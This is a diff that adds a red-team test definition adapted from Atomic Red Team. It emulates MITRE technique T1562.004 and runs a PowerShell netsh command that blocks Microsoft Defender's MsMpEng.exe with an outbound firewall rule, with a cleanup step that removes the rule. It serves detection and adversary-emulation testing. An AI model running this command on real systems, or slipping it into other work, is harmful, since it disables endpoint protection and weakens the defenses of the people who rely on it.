@@ -1,0 +1,55 @@
+# Adapted from Atomic Red Team - Impair Defenses: Disable or Modify System Firewall
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1562.004
+# Original auto_generated_guid: 6f5822d2-d38d-4f48-9bfc-916607ff6b8c
+
+---
+api_version: 2.0
+uuid: 1faa4749-81e8-4574-9ed8-bd0ffe5847a3
+name: Block Microsoft Defender with Firewall
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  This test will attempt to filter the MsMpEng.exe through the system firewall
+
+mitre:
+  tactics:
+    - "TA0005 Defense Evasion"
+  techniques:
+    - "T1562 Impair Defenses"
+  subtechniques:
+    - "T1562.004 Disable or Modify System Firewall"
+
+requirements:
+  platforms:
+    - os: windows
+  superuser: true
+
+args:
+  - name: rule_name
+    description: Name of the firewall rule
+    type: string
+    default: "Atomic Test"
+  # this file path changes depending on the version of Windows Defender
+  - name: exe_file_path
+    description: Path to exe file
+    type: path
+    default: "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25080.5-0\\MsMpEng.exe"
+
+steps:
+  - name: ensure_exe_exists
+    executor: powershell
+    inline: |
+      if (-not (Test-Path "{{.Args.exe_file_path}}")) {
+        Write-Error "Executable not found at {{.Args.exe_file_path}}. Exiting..."
+        exit 1
+      }
+
+  - name: block_exe_with_firewall
+    executor: powershell
+    inline: |
+      netsh advfirewall firewall add rule name="{{.Args.rule_name}}" dir=out action=block program="{{.Args.exe_file_path}}" enable=yes
+    cleanup:
+      executor: powershell
+      inline: |
+        netsh advfirewall firewall delete rule name="{{.Args.rule_name}}" | Out-Null
